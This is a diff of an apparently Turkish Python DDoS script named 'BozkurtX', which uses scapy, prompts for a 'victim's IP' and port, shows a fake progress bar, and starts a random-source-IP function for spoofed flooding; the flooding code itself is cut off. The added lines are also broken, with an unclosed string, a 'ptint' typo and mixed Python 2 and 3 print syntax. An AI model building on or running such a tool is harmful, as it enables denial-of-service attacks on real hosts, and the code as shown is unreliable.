@@ -1,20 +1,20 @@
-print ("Bu program BozkurtX için tasarlanmıştır yasadışı kullanım yasak")
-print("""
-	dbdbbd      dbbddb    dbbdbdb  db  dbdb                dbdbdbdb   dbdbdbdb  db         db
-	db   db   db     db       db   db db     db         db  db     db     db      db      db
-	dbdbdb    db     db      db    dbd       db         db  db    db      db        db   db
-	db        db     db     db     dbd       db         db  db  db        db         db db    
-	dbdbdb    db     db    db      db db     db         db  dbdb          db       db    db
-	db   db   db     db   db       db  db    db         db  db db         db     db        db
-   	dbdbdb      dbdbdb    dbdbdbdb db    dbdb  dbdbdbdbd    db   dbdb     db   db            bd
-   	- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -- - - - - - - - - -- - - - - - - - -- - - - - - 
-     -- - - - -- - - - - - -- - - - -  - -- - - - - - -- - - - - - - - - - - - - - - -- - - - - - - - - - - -
-                                   Tasarlayan:Hydrax
- """)
-print ("https://www.youtube.com/channel/UC-0OiCnr2tM4U8oJNhscYLw")
 import random
 from scapy.all import *
+os.system ("clear")
+os.system ("figlet BOZKURTX DDOS ATTACK
 targetIP = input("Kurbanın IP adresi: ")
+port = input("Port:   ")
+os.system("clear")
+os.system("figlet DDOS BASLATILIYOR")
+print "[                    ] 0% "
+time.sleep(5)
+print "[=====               ] 25%"
+time.sleep(5)
+print "[==========          ] 50%"
+time.sleep(5)
+print "[===============     ] 75%
+ptint "[====================] 100%"
+time.sleep(3)
 i=1
  
 def get_randomSourceIP():
